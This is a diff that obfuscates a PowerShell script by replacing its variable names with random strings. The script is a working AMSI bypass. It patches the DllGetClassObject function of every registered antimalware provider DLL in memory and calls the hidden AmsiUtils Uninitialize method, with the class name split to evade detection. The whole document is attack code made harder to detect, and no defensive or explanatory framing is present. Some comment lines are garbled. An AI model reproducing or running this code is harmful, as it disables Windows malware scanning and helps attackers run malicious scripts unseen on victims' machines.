@@ -9,23 +9,23 @@
 
 function Get-ProcAddress {
     Param(
-        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
-        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+        [Parameter(Position = 0, Mandatory = $True)] [String] $XiaJbYBbeKKyvkpFzmIYAdCEM,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $WDudwfJnvToNmDRVetakqFeAMEAj
     )
 
     # Microsoft".
-    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+    $BXOTMmgznZOWIWutzvIWsmZpJmfdaFnQqtDeg = [AppDomain]::CurrentDomain.GetAssemblies() |
     Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
-    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG = $BXOTMmgznZOWIWutzvIWsmZpJmfdaFnQqtDeg.GetType('Microsoft.Win32.UnsafeNativeMethods')
     # Microsoft".
-    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    $ekCFXGSUTGJqECsaYeCnuduih = $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG.GetMethod('GetModuleHandle')
+    $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL = $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
     # Microsoft".
-    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
-    $tmpPtr = New-Object IntPtr
-    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    $wqOTykoTvZtofFduihBsyUDLfZbSWfETIohGqYKhIqNi = $ekCFXGSUTGJqECsaYeCnuduih.Invoke($null, @($XiaJbYBbeKKyvkpFzmIYAdCEM))
+    $NHYfoTpMPmwtRSuxsyGttXkFigDCTgISaUhhwl = New-Object IntPtr
+    $rKjcZefFNJcXgIKBMvPVvjBlVrLBZgSQrGuujP = New-Object System.Runtime.InteropServices.HandleRef($NHYfoTpMPmwtRSuxsyGttXkFigDCTgISaUhhwl, $wqOTykoTvZtofFduihBsyUDLfZbSWfETIohGqYKhIqNi)
     # Microsoft".
-    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+    return $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$rKjcZefFNJcXgIKBMvPVvjBlVrLBZgSQrGuujP, $WDudwfJnvToNmDRVetakqFeAMEAj))
 }
 function Get-DelegateType
 {
@@ -35,60 +35,60 @@ function Get-DelegateType
             
         [Parameter( Position = 0)]
         [Type[]]
-        $Parameters = (New-Object Type[](0)),
+        $miwlvOeLZDyXuxWHJkpSlpybFpifRMKMufDCVtFcQ = (New-Object Type[](0)),
             
         [Parameter( Position = 1 )]
         [Type]
-        $ReturnType = [Void]
+        $sewDuhljvjfrfFRaEXMXQKXGdWu = [Void]
     )
 
-    $Domain = [AppDomain]::CurrentDomain
-    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
-    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
-    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
-    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
-    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
-    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+    $MxsCWQkirYwbxnMceTHoJnbWI = [AppDomain]::CurrentDomain
+    $eeLTktnnTbOQlmmfQsXQbmmwAFSBtvCqQgOejkwMXi = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $YMKOegxTsgtbjefOaGwypxhBioApldWvemHQynU = $MxsCWQkirYwbxnMceTHoJnbWI.DefineDynamicAssembly($eeLTktnnTbOQlmmfQsXQbmmwAFSBtvCqQgOejkwMXi, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $DtxsiozGIBpwqUOKrsNYm = $YMKOegxTsgtbjefOaGwypxhBioApldWvemHQynU.DefineDynamicModule('InMemoryModule', $false)
+    $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX = $DtxsiozGIBpwqUOKrsNYm.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $UtCDtGTrvomTpLmMdQygwr = $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $miwlvOeLZDyXuxWHJkpSlpybFpifRMKMufDCVtFcQ)
+    $UtCDtGTrvomTpLmMdQygwr.SetImplementationFlags('Runtime, Managed')
+    $MONDnwypPAmyHFBetNePdZBWPAXMbQPGbvKiw = $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sewDuhljvjfrfFRaEXMXQKXGdWu, $miwlvOeLZDyXuxWHJkpSlpybFpifRMKMufDCVtFcQ)
+    $MONDnwypPAmyHFBetNePdZBWPAXMbQPGbvKiw.SetImplementationFlags('Runtime, Managed')
         
-    Write-Output $TypeBuilder.CreateType()
+    Write-Output $pRnBIHBvCgmdNsbwpMBedZHJuaWamUjwrmROBBWxLX.CreateType()
 }
-$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
-$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
-$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
-$LoadLibraryDelegate)
-$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
-$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
-$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
-$GetProcAddressDelegate)
-$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
-$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
-$VirtualProtectDelegate)
+$nShFGADGepLRbjchbfORxARjDDJUcZxnsPWKzf = Get-ProcAddress kernel32.dll LoadLibraryA
+$acQWmiDHVJXrcQSbvZoBtFeSaSlJyXsq = Get-DelegateType @([String]) ([IntPtr])
+$mjWCdQCbAWoAAiuIGpBPTpWfpCbzvuMWxMwpg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nShFGADGepLRbjchbfORxARjDDJUcZxnsPWKzf,
+$acQWmiDHVJXrcQSbvZoBtFeSaSlJyXsq)
+$SKhZNBPXorcAfRDOQgUTuuunE = Get-ProcAddress kernel32.dll GetProcAddress
+$doKVuADhmBcanLPoNZHhZrxEUfqRgrqFcCxPBtoYR = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+$XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SKhZNBPXorcAfRDOQgUTuuunE,
+$doKVuADhmBcanLPoNZHhZrxEUfqRgrqFcCxPBtoYR)
+$ktJyURCZDtrwTVagNkPUxYSkxPeyFdBmpxHGCECj = Get-ProcAddress kernel32.dll VirtualProtect
+$LMIiweqjoxVyQMFjkJKV = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+$gQpjpZSYweJRJjjDUERR = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ktJyURCZDtrwTVagNkPUxYSkxPeyFdBmpxHGCECj,
+$LMIiweqjoxVyQMFjkJKV)
 
-$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
-$p = 0
+$otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
+$fEdHliqJDxoHggMKvaVQAQalfYTujScnzYiaovjFamoJW = 0
 
-foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
+foreach ($JYOnzgBLFNOFSknMxMBrDIapNFlvTbcuBhNep in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
 {
-    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
-    $dllPath = Get-ItemPropertyValue -Name '(Default)' $registry -ErrorAction SilentlyContinue
-    if ($dllPath)
+    $bWwnlpiJrHklKaURntlelpqpDspIvgNTBXYdh = 'HKLM:\Software\Classes\CLSID\' + $JYOnzgBLFNOFSknMxMBrDIapNFlvTbcuBhNep + '\InprocServer32'
+    $HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr = Get-ItemPropertyValue -Name '(Default)' $bWwnlpiJrHklKaURntlelpqpDspIvgNTBXYdh -ErrorAction SilentlyContinue
+    if ($HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr)
     {
-        $providerDLL = Split-Path $dllPath -leaf
-        $dll = $providerDLL -replace '"', ""
-        $hDLL = $LoadLibrary.Invoke($dll) 
-        if ($hdll -ne 0)
+        $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf = Split-Path $HNTJrrGtXKcfIRfTecbcyPKdREdRSaqtr -leaf
+        $aILpijVvncfzjaazhIIEcsovDolfrljcHgRifbjl = $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf -replace '"', ""
+        $BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK = $mjWCdQCbAWoAAiuIGpBPTpWfpCbzvuMWxMwpg.Invoke($aILpijVvncfzjaazhIIEcsovDolfrljcHgRifbjl) 
+        if ($BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK -ne 0)
         {
-            Write-host "[*] Provider found - " $providerDLL
-            $Address = $GetProcAddress.Invoke($hDLL, "DllGetClassObject")        
-            $VirtualProtect.Invoke($Address, [uint32]$Patch.Length, 0x40, [ref]$p)
-            [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+            Write-host "[*] Provider found - " $ZlOOhIKlIYjuEUoEcLYdehxbzOTElsaCUOHJMnysf
+            $QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX = $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL.Invoke($BPgOmUPZNisMbBJVhBvMULSQaNRDhcUsTNcGuBPTK, "DllGetClassObject")        
+            $gQpjpZSYweJRJjjDUERR.Invoke($QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX, [uint32]$otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ.Length, 0x40, [ref]$fEdHliqJDxoHggMKvaVQAQalfYTujScnzYiaovjFamoJW)
+            [System.Runtime.InteropServices.Marshal]::Copy($otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ, 0, $QWEcmssqWcaWokxZkwfMHJzpeTSQTmKPuzMuKoAWkeHX, $otpjlvtFuoBOaHAOQjzOkOVhhkMNrhfcZHqPLLNBsZZ.Length)
         }
     }
 }
 
 $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
-$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
-$Uninitialize.Invoke($object,$null)
+$uhrnAoNJDwPmVKAcHvbuHb = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
+$uhrnAoNJDwPmVKAcHvbuHb.Invoke($object,$null)
